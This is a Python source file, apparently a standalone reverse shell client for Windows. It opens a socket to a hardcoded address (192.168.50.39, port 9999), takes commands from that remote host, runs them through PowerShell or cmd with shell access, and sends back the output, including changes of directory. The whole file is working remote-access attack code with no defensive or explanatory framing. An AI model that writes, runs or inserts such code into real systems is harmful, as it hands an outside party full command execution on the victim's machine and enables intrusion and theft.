import socket
import subprocess
import os

HOST = '192.168.50.39'
PORT = 9999

mode = "ps"
cwd = os.path.expanduser("C:\\Users\\Admin")  # default directory

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((HOST, PORT))

    while True:
        data = s.recv(4096)
        if not data:
            break
        command = data.decode().strip()

        if command == 'lsw ps':
            mode = "ps"
            s.sendall(b"[LSW] Switched to PowerShell mode.\n")
            continue
        elif command == 'lsw cmd':
            mode = "cmd"
            s.sendall(b"[LSW] Switched to CMD mode.\n")
            continue

        try:
            if command.lower().startswith("cd"):
                parts = command.split(maxsplit=1)
                if len(parts) == 2:
                    new_path = parts[1].strip('"')
                    new_path = new_path.replace("/", "\\")
                    if new_path == "..":
                        cwd = os.path.dirname(cwd)
                    else:
                        combined = os.path.abspath(os.path.join(cwd, new_path))
                        if os.path.isdir(combined):
                            cwd = combined
                        else:
                            raise FileNotFoundError(f"The system cannot find the path specified: {combined}")
                # After cd, just return new prompt
                prompt = cwd + "> "
                s.sendall(prompt.encode())
                continue

            # Run command in tracked directory
            if mode == "ps":
                output = subprocess.check_output(
                    ["powershell.exe", "-NoProfile", "-Command", f"& {{ {command} }}"],
                    stderr=subprocess.STDOUT,
                    text=True,
                    cwd=cwd
                )
            else:
                output = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT,
                    text=True,
                    cwd=cwd
                )

            full_output = f"{cwd}> {command}\n{output}"

        except subprocess.CalledProcessError as e:
            full_output = f"{cwd}> {command}\n{e.output}"
        except FileNotFoundError as e:
            full_output = f"{cwd}> {command}\n{str(e)}"

        s.sendall(full_output.encode())
